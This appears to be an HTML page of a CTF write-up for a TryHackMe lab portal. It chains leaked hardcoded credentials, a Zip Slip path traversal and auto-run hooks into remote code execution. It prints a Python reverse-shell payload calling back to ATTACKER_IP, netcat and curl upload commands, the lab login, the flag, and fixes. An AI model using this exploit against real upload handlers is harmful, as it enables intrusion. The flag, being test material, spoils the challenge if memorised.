@@ -1,0 +1,119 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Day 10 · The Hollow Shell — Hacker Holidays</title>
+<meta name="description" content="Write-ups for TryHackMe's Hacker Holidays 13-day CTF: OSINT, AI security, web exploitation, cloud, forensics and boot2root.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=IBM+Plex+Sans:wght@400;500;600&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../styles.css">
+
+</head>
+<body>
+<header class="topbar">
+  <div class="topbar-inner">
+    <a class="brand" href="../index.html">Hacker<span class="dot">.</span>Holidays</a>
+    <nav class="topnav">
+      <a href="../index.html">Intro</a>
+      <a href="../index.html#doors" class="current">Write-ups</a>
+      <a href="https://tryhackme.com/room/hackerholidays" target="_blank" rel="noopener">TryHackMe Room ↗</a>
+    </nav>
+  </div>
+</header>
+<div class="day-shell">
+  <aside class="sidebar">
+  <a class="back" href="../index.html">← Back to intro</a>
+  <button class="mobile-toggle" type="button">Jump to a day <span class="arrow">▾</span></button>
+  <div class="sidebar-title">All doors</div>
+  <ul><li><a class="" href="day-0.html"><span class="n">00</span>The Brochure</a></li><li><a class="" href="day-1.html"><span class="n">01</span>The Concierge Knows Too Much</a></li><li><a class="" href="day-2.html"><span class="n">02</span>Room 404</a></li><li><a class="" href="day-3.html"><span class="n">03</span>Complimentary</a></li><li><a class="" href="day-4.html"><span class="n">04</span>Packed Light</a></li><li><a class="" href="day-5.html"><span class="n">05</span>Beach Bar</a></li><li><a class="" href="day-6.html"><span class="n">06</span>Overheard at Breakfast</a></li><li><a class="" href="day-7.html"><span class="n">07</span>Do Not Disturb</a></li><li><a class="" href="day-8.html"><span class="n">08</span>Towel on the sunbed</a></li><li><a class="" href="day-9.html"><span class="n">09</span>CryptoCabana</a></li><li><a class="active" href="day-10.html"><span class="n">10</span>The Hollow Shell</a></li><li><a class="" href="day-12.html"><span class="n">12</span>After Hours</a></li><li><a class="" href="day-13.html"><span class="n">13</span>The Guestbook</a></li><li><a class="" href="day-14.html"><span class="n">14</span>Management Wants a Word</a></li></ul>
+</aside>
+  <main class="day-main">
+    <div class="day-header">
+      <div class="badge-row">
+        <span class="badge day">DOOR 10</span>
+        <span class="badge cat">Web</span>
+        <span class="badge diff-medium">Medium</span>
+      </div>
+      <h1>The Hollow Shell</h1>
+    </div>
+    <div class="content">
+      <figure class="shot"><img src="../images/image33.png" alt="" loading="lazy"></figure>
+<h2>Summary</h2>
+<p>The Byte Lotus &quot;Shoreline Display&quot; portal lets staff upload a .zip &quot;shell&quot; — a themed asset pack for in-room tablets. Hardcoded credentials leaked in an HTML comment gave initial access to the portal.</p>
+<p>The upload feature extracted archive contents without sanitizing internal file paths (a Zip Slip vulnerability), and a hooks field in the manifest was auto-loaded and executed by a background &quot;theme worker.&quot; Combining the two let us drop a malicious Python file directly into the application&#x27;s hooks/ directory, achieving remote code execution as the roomservice user.</p>
+<h2>Recon</h2>
+<div class="code-block"><div class="code-bar"><span></span><span></span><span></span></div><pre>Nmap scan of the target showed two open ports:</pre></div>
+<figure class="shot"><img src="../images/image18.png" alt="" loading="lazy"></figure>
+<p>22/tcp   open  ssh</p>
+<p>5000/tcp open  http</p>
+<p>Port 5000 hosted the &quot;Byte Lotus — Room Service&quot; portal, redirecting unauthenticated requests to /login.</p>
+<figure class="shot"><img src="../images/image17.png" alt="" loading="lazy"></figure>
+<h2>Credential Leak</h2>
+<p>Viewing the page source of /login revealed a developer comment left in the HTML:</p>
+<figure class="shot"><img src="../images/image20.png" alt="" loading="lazy"><figcaption>Logging in with concierge / StayNoticed2024! succeeded and redirected to /dashboard.</figcaption></figure>
+<h2>Exploring the Upload Feature</h2>
+<p>The dashboard exposed a &quot;Bring a shell ashore&quot; upload form:</p>
+<figure class="shot"><img src="../images/image56.png" alt="" loading="lazy"></figure>
+<ul><li>Accepts a .zip file</li><li>Each archive must contain a shell.json manifest describing assets</li><li>Allowed asset types: png jpg gif svg css json</li><li>Notably: shells &quot;may include optional automation hooks — the theme worker applies these for you shortly after the shell comes ashore&quot;</li></ul>
+<div class="shot-row"><figure class="shot"><img src="../images/image36.png" alt="" loading="lazy"></figure><figure class="shot"><img src="../images/image43.png" alt="" loading="lazy"></figure></div>
+<p>A minimal test upload confirmed the app extracts the zip to a predictable path and serves files back statically:</p>
+<figure class="shot"><img src="../images/image82.png" alt="" loading="lazy"></figure>
+<p>The manifest was echoed back verbatim, confirming the server parses and stores whatever JSON keys are supplied — including keys not documented in the UI, such as hooks.</p>
+<h2>Finding the Vulnerability: Zip Slip + Hook Auto-Load</h2>
+<p>Two things stood out:</p>
+<ol><li>No path sanitization on extraction. The server trusted the internal filenames of the uploaded zip rather than stripping directory traversal sequences. A crafted entry such as ../../hooks/callback.py would be extracted outside the intended shells/&lt;id&gt;/ sandbox.</li><li>A hooks/ directory next to the Flask app (/var/www/conch/hooks) is auto-loaded by a theme_worker.py process — any Python file placed there gets executed shortly after being written.</li></ol>
+<p>Chaining these together: instead of just writing a harmless file outside the sandbox, we could plant a malicious hook directly where the worker would pick it up and run it — turning an arbitrary file write into remote code execution.</p>
+<h2>Building the Exploit</h2>
+<div class="code-block"><div class="code-bar"><span></span><span></span><span></span></div><pre>import zipfile, json
+manifest = {&quot;name&quot;: &quot;reverse&quot;, &quot;assets&quot;: []}</pre></div>
+<p>callback = &#x27;&#x27;&#x27;</p>
+<div class="code-block"><div class="code-bar"><span></span><span></span><span></span></div><pre>import socket, os, pty</pre></div>
+<p>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</p>
+<p>sock.connect((&quot;ATTACKER_IP&quot;, 4444))</p>
+<p>for fd in (0, 1, 2):</p>
+<p>os.dup2(sock.fileno(), fd)</p>
+<div class="code-block"><div class="code-bar"><span></span><span></span><span></span></div><pre>pty.spawn(&quot;/bin/bash&quot;)
+&#x27;&#x27;&#x27;</pre></div>
+<p>with zipfile.ZipFile(&quot;reverse-shell.zip&quot;, &quot;w&quot;) as z:</p>
+<p>z.writestr(&quot;shell.json&quot;, json.dumps(manifest))</p>
+<p>z.writestr(&quot;../../hooks/callback.py&quot;, callback)</p>
+<p>The shell.json entry keeps the archive looking legitimate to the upload handler, while the second entry&#x27;s path traversal (../../hooks/callback.py) escapes the per-upload sandbox and lands in the app&#x27;s real hooks/ directory.</p>
+<figure class="shot"><img src="../images/image87.png" alt="" loading="lazy"></figure>
+<h2>Getting the Shell</h2>
+<p>Start a listener:</p>
+<div class="code-block"><div class="code-bar"><span></span><span></span><span></span></div><pre>nc -lvnp 4444</pre></div>
+<figure class="shot"><img src="../images/image50.png" alt="" loading="lazy"></figure>
+<p>Authenticate and upload the payload:</p>
+<div class="code-block"><div class="code-bar"><span></span><span></span><span></span></div><pre>curl -s -c cookies.txt -X POST http://TARGET:5000/login \</pre></div>
+<p>-d &#x27;username=concierge&#x27; -d &#x27;password=StayNoticed2024!&#x27; -o /dev/null</p>
+<div class="code-block"><div class="code-bar"><span></span><span></span><span></span></div><pre>curl -s -b cookies.txt -F &#x27;shell=@reverse-shell.zip&#x27; http://TARGET:5000/upload</pre></div>
+<figure class="shot"><img src="../images/image42.png" alt="" loading="lazy"></figure>
+<p>Within seconds, the theme worker picked up and executed callback.py, and a shell landed as roomservice in /var/www/conch:</p>
+<figure class="shot"><img src="../images/image4.png" alt="" loading="lazy"></figure>
+<p>Upgraded to a full TTY:</p>
+<div class="code-block"><div class="code-bar"><span></span><span></span><span></span></div><pre>python3 -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</pre></div>
+<figure class="shot"><img src="../images/image63.png" alt="" loading="lazy"></figure>
+<h2>Finding the Flag</h2>
+<p>find / -iname &quot;*flag*&quot; 2&gt;/dev/null</p>
+<p>Turned up:</p>
+<div class="shot-row"><figure class="shot"><img src="../images/image77.png" alt="" loading="lazy"></figure><figure class="shot"><img src="../images/image22.png" alt="" loading="lazy"></figure></div>
+<h2>Root Cause &amp; Fix</h2>
+<ul><li>Zip Slip: always sanitize archive member names before extraction — reject or strip any entry containing .. or resolving outside the intended extraction directory (e.g., validate with os.path.realpath + a prefix check before writing).</li><li>Auto-loaded hooks: never exec/import arbitrary files dropped into an application directory. If a plugin/hook system is required, use a signed or allow-listed manifest, run hooks in a sandboxed subprocess with least privilege, and keep the hook directory outside any path reachable by user-controlled extraction.</li><li>Hardcoded credentials in comments: don&#x27;t ship default credentials in source, even for &quot;internal&quot; staff portals — enforce password rotation before first use, not just recommend it.</li></ul>
+<h2>Flag</h2>
+<div class="code-block"><div class="code-bar"><span></span><span></span><span></span></div><pre>THM{z1p_sl1pp3d_1nt0_a_sh3ll}</pre></div>
+    </div>
+    <div class="day-pager"><a class="pager-btn prev" href="day-9.html"><span class="lbl">← Previous</span><span class="ttl">Day 09 · CryptoCabana</span></a><a class="pager-btn next" href="day-12.html"><span class="lbl">Next →</span><span class="ttl">Day 12 · After Hours</span></a></div>
+  </main>
+</div>
+<footer>
+  <div class="wrap">
+    Built for the TryHackMe <strong style="color:var(--text-muted)">Hacker Holidays</strong> event · write-ups for learning purposes only.<br>
+    <a href="https://tryhackme.com" target="_blank" rel="noopener">TryHackMe</a> · <a href="../index.html">Back to top</a>
+  </div>
+</footer>
+
+<script src="../script.js"></script>
+</body>
+</html>
